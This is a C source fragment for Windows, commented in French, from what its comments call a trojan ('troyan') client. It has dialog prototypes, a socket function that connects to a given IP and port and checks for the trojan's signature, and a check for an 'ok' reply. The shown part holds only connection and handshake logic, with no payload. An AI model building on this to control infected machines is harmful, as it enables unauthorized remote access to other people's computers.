

// Prototypes:
//-------------

LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK DlgProc2(HWND Hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK DlgProc3(HWND HWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK DlgProc4(HWND HwNd, UINT msg, WPARAM wParam, LPARAM lParam);
int connection(char Fip[],int Fport,HWND hWnd);
int checkok(void);



//CONNECTION AU SERVER:
//----------------------

int connection(char Fip[],int Fport,HWND hWnd)
{


	//initialisation du syst�me de sockets:
	verreq=MAKEWORD(2,2);
	WSAStartup(verreq,&wsaData);

	//remplissage de la structure sockaddr_in
	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=inet_addr(Fip);
	sin.sin_port=htons(Fport);

	s = socket(PF_INET, SOCK_STREAM, 0);

	if (connect(s,(struct sockaddr *)&sin,len)==SOCKET_ERROR)
	{
		SetDlgItemText(hWnd,IDC_STATUS,"Erreur lors de la connection");
		goto error;
	}

	SetDlgItemText(hWnd,IDC_STATUS,"Attente de la signature");
	//check la signature du troyan

	recu = recv(s,buf,sizeof(buf),0);
	if (recu==0) {SetDlgItemText(hWnd,IDC_STATUS,"Connection perdue");goto error;}

	comparaison = lstrcmp(buf,signature);
	if (comparaison==0){SetDlgItemText(hWnd,IDC_STATUS,"Connect� !!!");}
	else {SetDlgItemText(hWnd,IDC_STATUS,"Pas de connection");goto error;}
	return (0);

error:
	int nombre;
	char buffer[30];
	nombre=WSAGetLastError();
	sprintf(buffer,"%d",nombre);
	MessageBox(NULL,buffer,"ERROR : WSAGetLastError :",MB_OK);
	closesocket(s);
	WSACleanup();

return (0);

}

int checkok(void)
{
	recv(s,buf,sizeof(buf),0);

	comparaison = lstrcmp(buf,ok);
	if (comparaison==0){return(0);}
	else MessageBox(NULL,"La connection avec le server semble �tre perdue","arf",MB_OK);

	return(0);
}
